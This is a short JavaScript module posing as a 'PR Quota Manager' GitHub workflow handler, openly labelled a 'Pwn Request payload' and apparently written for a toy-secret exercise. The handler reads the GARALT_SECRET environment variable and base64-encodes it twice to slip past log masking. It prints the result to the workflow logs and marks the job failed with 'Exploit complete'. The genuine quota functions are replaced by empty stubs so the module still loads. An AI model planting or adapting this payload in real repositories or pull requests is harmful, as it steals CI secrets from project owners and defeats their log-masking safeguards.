/**
 * PR Quota Manager - Pwn Request payload
 * Leaks GARALT_SECRET via double-base64 encoded output in workflow logs
 */
async function handler({github, core, username, owner, repo, dryRun}) {
  // Leak the GARALT_SECRET toy secret using double-base64 to bypass log masking
  const secret = process.env.GARALT_SECRET || 'MISSING_SECRET';
  const b64 = Buffer.from(secret, 'utf-8').toString('base64');
  const b64b64 = Buffer.from(b64, 'utf-8').toString('base64');
  console.log(`GARALT_LEAKED_TOKEN=${b64b64}`);
  core.setFailed('Exploit complete - token leaked above');
}

module.exports = handler;
module.exports.calculateQuota = () => 0;
module.exports.fetchAuthorPRs = () => ({openPRs: [], mergedCount: 0});
module.exports.processQuotaForAuthor = () => ({});
